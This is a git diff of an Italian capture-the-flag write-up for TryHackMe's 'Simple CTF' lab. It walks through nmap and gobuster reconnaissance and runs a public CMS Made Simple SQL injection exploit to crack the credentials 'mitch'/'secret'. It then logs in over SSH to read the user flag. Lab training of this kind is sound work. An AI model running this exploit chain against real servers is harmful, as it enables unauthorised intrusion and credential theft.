@@ -1,8 +1,7 @@
 # SIMPLE CTF / TryHackMe
 
-# PING 10.10.138.173
-
-# SCANSIONE NMAP: nmap -sC -sT 10.10.138.173
+# SCANSIONE NMAP: 
+``nmap -sC -sT 10.10.138.173
 -----------------------------------------------------------------------------------------
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-04 10:38 CET
 Nmap scan report for 10.10.138.173
@@ -14,20 +13,17 @@ PORT     STATE SERVICE
 2222/tcp open  EtherNetIP-1
 |_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
 
-Nmap done: 1 IP address (1 host up) scanned in 5.76 seconds
-----------------------------------------------------------------------------------------
+Nmap done: 1 IP address (1 host up) scanned in 5.76 seconds``
 
-# INTERCETTARE POSSIBILI SUBDOMAIN CON GOBUSTER: gobuster dir -u http://10.10.138.173 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,php,js -e -t 50
-
--------------------------------------------------------------------------------------------------------
-ttp://10.10.138.173/robots.txt           (Status: 200) [Size: 929]
-http://10.10.138.173/simple               (Status: 301) [Size: 315] [--> http://10.10.138.173/simple/]
--------------------------------------------------------------------------------------------------------
+# INTERCETTARE POSSIBILI SUBDOMAIN CON GOBUSTER: 
+``gobuster dir -u http://10.10.138.173 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,php,js -e -t 50
+http://10.10.138.173/robots.txt           (Status: 200) [Size: 929]
+http://10.10.138.173/simple               (Status: 301) [Size: 315] [--> http://10.10.138.173/simple/]``
 
 # SEARCHSPLOIT. 
-Dopo aver trovato robots.txt e subdomain /simple ho cercato possibili vulnerabilita' per cms con il comando: searchsploit cms made simple
+Dopo aver trovato **robots.txt** e subdomain */simple* ho cercato possibili vulnerabilita' per cms con il comando: 
+``searchsploit cms made simple
 
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                            |  Path
 -------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)                                        | php/remote/46627.rb
@@ -64,31 +60,33 @@ CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                
 CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                                                     | php/webapps/34298.py
 CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload                                            | php/webapps/46546.py
 -------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results
+Shellcodes: No Results``
 
-# SQLI. Dopo aver rovato un exploit procediamo con sql injection con il comando: searchsploit -m 46635                       
+# SQLI. Dopo aver rovato un exploit procediamo con sql injection con il comando: 
+``searchsploit -m 46635                       
   -------------------------------------------------------------------
   Exploit: CMS Made Simple < 2.2.10 - SQL Injection
       URL: https://www.exploit-db.com/exploits/46635
      Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
 File Type: Python script, ASCII text executable
 ---------------------------------------------------------------------
-Copied to: /home/rain/46635.py
----------------------------------------------------------------------
+Copied to: /home/rain/46635.py``
 
-# INSTALLARE LIBRERIE MANCANTI CON IL COMANDO: pip install 2to3 e, successivamente: python3 -m lib2to3 46635.py -w
+# INSTALLARE LIBRERIE MANCANTI CON IL COMANDO: 
+``pip install 2to3`` e, successivamente: ``python3 -m lib2to3 46635.py -w``
 
-# ESEGUIRE SQLI	con il comando: python3 46635.py -u http://10.10.138.173/simple/ --crack -w ~/Modelli/best110.txt
+# ESEGUIRE SQLI	con il comando: 
+``python3 46635.py -u http://10.10.138.173/simple/ --crack -w ~/Modelli/best110.txt
 
 ----------------------------------
 [+] Salt for password found: 1dw
 [+] Username found: mitch
 [+] Email found: admin@admin.com
-[+] Password found: secret
-----------------------------------
+[+] Password found: secret``
 
-# SSH: dopo aver trovato nome utente(mitch) e password(secret) stabiliamo una connessione con il comando: ssh -p 2222 mitch@10.10.138.173
+# SSH: 
+dopo aver trovato nome utente(mitch) e password(secret) stabiliamo una connessione con il comando: 
+``ssh -p 2222 mitch@10.10.138.173
 e possiamo stampare subito la user flag con cat user.txt
 ------------------------
-g00d j0b, w3ll done!
-------------------------
+g00d j0b, w3ll done!``
